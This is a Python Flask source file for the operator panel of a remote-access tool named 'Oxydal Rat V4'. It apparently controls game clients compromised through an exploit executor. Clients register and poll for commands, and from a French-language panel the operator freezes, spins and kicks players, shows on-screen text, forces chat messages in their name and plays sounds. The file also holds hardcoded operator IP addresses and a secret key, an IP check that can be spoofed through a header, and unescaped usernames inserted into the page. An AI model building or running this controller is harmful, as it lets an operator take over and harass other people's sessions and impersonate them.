from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "oxydal_v4_final"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1"}

connected_players = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

@app.before_request
def protect():
    if request.path in ["/", "/troll"]: check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat | V4</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:#000;color:#fff;display:flex;overflow:hidden}
.sidebar {width:260px; background:#0a0a0a; border-right:1px solid #333; display:flex; flex-direction:column; padding:25px; height:100vh}
.sidebar h2 {font-family:Orbitron; color:#00ffaa; margin-bottom:40px; text-align:center}
.nav-btn {background:none; border:none; color:#aaa; padding:15px; text-align:left; font-size:1.1rem; cursor:pointer; border-radius:12px; margin-bottom:10px}
.nav-btn.active {background:rgba(0,255,170,0.1); color:#00ffaa; border-left:4px solid #00ffaa}
.main-content {flex:1; overflow-y:auto; padding:40px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:20px}
.card{background:#111;border-radius:15px;padding:20px;border:1px solid #333}
.name{font-size:1.4rem;color:#ffcc00;margin-bottom:10px;font-family:Orbitron}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 5px;font-size:0.8rem;text-transform:uppercase}
button.btn{padding:10px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:white;font-size:0.8rem;transition:0.2s}
button.btn:hover{filter:brightness(1.2)}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:25px;border-radius:15px;width:400px;border:1px solid #444}
.modal-content input{width:100%;padding:12px;margin:15px 0;background:#222;border:1px solid #444;color:white;border-radius:8px}
.history-item {background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:8px; border-left:4px solid #00ffaa}
</style>
</head>
<body>
<div class="sidebar">
    <h2>OXYDAL</h2>
    <button class="nav-btn active">Players</button>
</div>
<div class="main-content">
    <h1 style="font-family:Orbitron; color:#00ffaa; margin-bottom:30px">Active Players</h1>
    <div class="grid" id="players"></div>
</div>

<div class="modal" id="msgModal"><div class="modal-content"><h2>Texte au milieu</h2><input type="text" id="msgText" placeholder="Écris ici..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('msgModal')">Annuler</button><button class="btn" style="background:#00ffff;color:#000;flex:1" onclick="submitAction('message', 'msgText', 'msgModal')">Afficher</button></div></div></div>
<div class="modal" id="chatModal"><div class="modal-content"><h2>Faire parler le joueur</h2><input type="text" id="chatText" placeholder="Le joueur va dire ça..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('chatModal')">Annuler</button><button class="btn" style="background:#ffcc00;color:#000;flex:1" onclick="submitAction('chat', 'chatText', 'chatModal')">Envoyer Chat</button></div></div></div>
<div class="modal" id="soundModal"><div class="modal-content"><h2>Jouer Son</h2><input type="text" id="soundId" placeholder="Asset ID..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('soundModal')">Annuler</button><button class="btn" style="background:orange;flex:1" onclick="submitAction('playsound', 'soundId', 'soundModal')">Play</button></div></div></div>

<script>
const socket = io();
let currentUid = null;

function openModal(m, id) { currentUid = id; document.getElementById(m).classList.add('active'); }
function closeModal(m) { document.getElementById(m).classList.remove('active'); }

function submitAction(cmd, inputId, modalId) {
    const val = document.getElementById(inputId).value;
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentUid, cmd: cmd, assetId: val})});
    closeModal(modalId);
    document.getElementById(inputId).value = "";
}

function sendTroll(id, cmd) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
}

function render(data) {
    const grid = document.getElementById("players");
    grid.innerHTML = "";
    Object.entries(data.players).forEach(([id, p]) => {
        const card = document.createElement("div");
        card.className = "card";
        card.innerHTML = `
            <div class="name">${p.username}</div>
            <div class="category">Ecran & Chat</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <button class="btn" style="background:#00ffff;color:#000" onclick="openModal('msgModal','${id}')">TEXTE MILIEU</button>
                <button class="btn" style="background:#ffcc00;color:#000" onclick="openModal('chatModal','${id}')">FAIRE PARLER</button>
            </div>
            <div class="category">Trolls</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <button class="btn" style="background:#ff00ff" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn" style="background:#ff00ff" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn" style="background:#aa00ff" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn" style="background:#aa00ff" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn" style="background:#ff3366" onclick="sendTroll('${id}','kick')">KICK</button>
                <button class="btn" style="background:orange" onclick="openModal('soundModal','${id}')">SON</button>
                <button class="btn" style="background:#88ff88;color:#000" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn" style="background:#444" onclick="sendTroll('${id}','stopsound')">STOP SON</button>
            </div>
        `;
        grid.appendChild(card);
    });
}
socket.on("update", render);
</script>
</body>
</html>"""

@app.route("/")
def index(): return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register":
            connected_players[uid] = {"username": d.get("username"), "executor": d.get("executor"), "last": time.time()}
        elif d.get("action") == "heartbeat":
            if uid in connected_players: connected_players[uid]["last"] = time.time()
        return jsonify({"ok": True})
    
    uid = str(request.args.get("userid", ""))
    if uid in pending_commands:
        return jsonify(pending_commands.pop(uid))
    return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd, asset = str(d.get("userid")), d.get("cmd"), d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": asset}
    return jsonify({"ok": True})

def cleanup():
    while True:
        now = time.time()
        to_del = [u for u,p in connected_players.items() if now - p["last"] > 20]
        for u in to_del: del connected_players[u]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(cleanup)
    socketio.run(app, host="0.0.0.0", port=5000)
